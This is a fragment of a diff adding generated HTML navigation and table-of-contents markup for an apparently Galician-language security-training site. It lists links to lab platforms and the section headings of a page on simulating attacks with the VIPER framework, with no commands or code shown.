+    Introdución
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../practicas-taller-metasploitable3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Práctica Taller
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_4_3" id="__nav_3_4_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    VulnHub
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_4_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_4_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    VulnHub
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../vulnhub/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introdución
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../practicas-taller-vulnhub/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Prácticas Taller
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_4_4" id="__nav_3_4_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    TryHackMe
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_4_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_4_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    TryHackMe
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../tryhackme/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introdución
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../practicas-taller-tryhackme/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Prácticas Taller
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_4_5" id="__nav_3_4_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    HackTheBox
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_4_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_4_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    HackTheBox
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hackthebox/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introdución
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../practicas-taller-hackthebox/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Prácticas Taller
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_4_6" id="__nav_3_4_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    VulNyx
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_4_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_4_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    VulNyx
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../vulnyx/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introdución
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../practicas-taller-vulnyx/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Prácticas Taller
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_4_7" id="__nav_3_4_7_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DockerLabs
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_4_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_4_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    DockerLabs
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../dockerlabs/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introdución
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../practicas-taller-dockerlabs/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Prácticas Taller
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hacksplaining/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    HackSplaining
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4_9" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_4_9" id="__nav_3_4_9_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    picoCTF
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_4_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_4_9">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    picoCTF
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../picoctf/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introdución
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../practicas-taller-picoctf/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Prácticas Taller
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4_10" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_4_10" id="__nav_3_4_10_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    pwn.college
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_4_10_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_4_10">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    pwn.college
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../pwncollege/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introdución
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../practicas-taller-pwncollege/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Práctica Taller
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4_11" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_4_11" id="__nav_3_4_11_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PentesterLab
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_4_11_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_4_11">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    PentesterLab
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../pentesterlab/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introdución
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../practicas-taller-pentesterlab/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Prácticas Taller
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../machine-owasp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OWASP
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../s4vitar/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    S4vitar
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Simulación de ataques con VIPER
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Simulación de ataques con VIPER
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Táboa de contidos">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Táboa de contidos
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#escenario" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Escenario
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#alcance-da-proba" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Alcance da proba
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vm-1-atacante-instalacion-de-viper" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        VM-1 Atacante: instalación de VIPER
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="VM-1 Atacante: instalación de VIPER">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-requisitos-do-sistema" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Requisitos do sistema
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-instalacion-de-viper" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Instalación de VIPER
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-configuracion-do-dashboard-en-viper" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Configuración do Dashboard en VIPER
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exemplo-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exemplo 1: Reverse Shell
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exemplo 1: Reverse Shell">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#escenario-resumido" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Escenario resumido
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vm-1-atacante-viper" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        VM-1 Atacante: VIPER
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vm-2-maquina-vitima" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        VM-2 Máquina vítima
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vm-1-atacante-viper_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        VM-1 Atacante: VIPER
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exemplo-2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exemplo 2: Movemento Lateral (Expandir acceso)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exemplo 2: Movemento Lateral (Expandir acceso)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#escenario-resumido_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Escenario resumido
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Escenario resumido">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#obxectivo-movemento-lateral-dende-vm-2-cara-vm-3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Obxectivo: movemento lateral dende VM-2 cara VM-3.
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-1-acceso-a-vm-2-payload-activo" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Paso 1: Acceso á VM-2 (payload activo)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-2-movemento-lateral-cara-vm-3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Paso 2: Movemento lateral cara VM-3
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-3-movemento-lateral-con-psexec-smb" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Paso 3: Movemento lateral con psexec (SMB)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-4-verificar-acceso-a-vm-3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Paso 4: Verificar acceso á VM-3
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exemplo-3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exemplo 3: Persistencia
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exemplo 3: Persistencia">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#paso-1-acceder-a-vitima-con-psexec" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Paso 1: Acceder á vítima con psexec
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-2-poner-a-sesion-en-background" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Paso 2: Poñer a sesión en background
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-3-iniciar-un-multihandler-para-a-persistencia-lapela-msfconsole" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Paso 3: Iniciar un multi/handler para a persistencia (lapela Msfconsole)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-4-xerar-o-payload-para-persistencia" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Paso 4: Xerar o payload para persistencia
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-5-subir-o-payload-a-vm-3-e-crear-a-tarefa-programada" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Paso 5: Subir o payload a VM-3 e crear a tarefa programada
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-6-probar-ou-agardar-reconexion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Paso 6: Probar ou agardar reconexión
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#resumo" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Resumo
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#conclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Conclusión
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Apéndice
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Apéndice
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apendice/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Automatización dos escenarios
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apendice/sysreptor/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SysReptor (Vagrant + Docker)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apendice/openvas/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OpenVAS / Greenbone (OVA)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apendice/ollama/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Ollama (Vagrant + nativo)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apendice/viper/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    VIPER (Packer + VirtualBox)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Táboa de contidos">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Táboa de contidos
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#escenario" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Escenario
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#alcance-da-proba" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Alcance da proba
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vm-1-atacante-instalacion-de-viper" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        VM-1 Atacante: instalación de VIPER
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="VM-1 Atacante: instalación de VIPER">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-requisitos-do-sistema" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Requisitos do sistema
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-instalacion-de-viper" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Instalación de VIPER
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-configuracion-do-dashboard-en-viper" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Configuración do Dashboard en VIPER
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exemplo-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exemplo 1: Reverse Shell
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exemplo 1: Reverse Shell">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#escenario-resumido" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Escenario resumido
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vm-1-atacante-viper" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        VM-1 Atacante: VIPER
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vm-2-maquina-vitima" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        VM-2 Máquina vítima
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vm-1-atacante-viper_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        VM-1 Atacante: VIPER
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exemplo-2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exemplo 2: Movemento Lateral (Expandir acceso)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exemplo 2: Movemento Lateral (Expandir acceso)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#escenario-resumido_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Escenario resumido
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Escenario resumido">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#obxectivo-movemento-lateral-dende-vm-2-cara-vm-3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Obxectivo: movemento lateral dende VM-2 cara VM-3.
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-1-acceso-a-vm-2-payload-activo" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Paso 1: Acceso á VM-2 (payload activo)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-2-movemento-lateral-cara-vm-3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Paso 2: Movemento lateral cara VM-3
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-3-movemento-lateral-con-psexec-smb" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Paso 3: Movemento lateral con psexec (SMB)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-4-verificar-acceso-a-vm-3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Paso 4: Verificar acceso á VM-3
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exemplo-3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exemplo 3: Persistencia
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exemplo 3: Persistencia">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#paso-1-acceder-a-vitima-con-psexec" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Paso 1: Acceder á vítima con psexec
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-2-poner-a-sesion-en-background" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Paso 2: Poñer a sesión en background
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-3-iniciar-un-multihandler-para-a-persistencia-lapela-msfconsole" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Paso 3: Iniciar un multi/handler para a persistencia (lapela Msfconsole)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-4-xerar-o-payload-para-persistencia" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Paso 4: Xerar o payload para persistencia
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-5-subir-o-payload-a-vm-3-e-crear-a-tarefa-programada" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Paso 5: Subir o payload a VM-3 e crear a tarefa programada
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-6-probar-ou-agardar-reconexion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Paso 6: Probar ou agardar reconexión
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
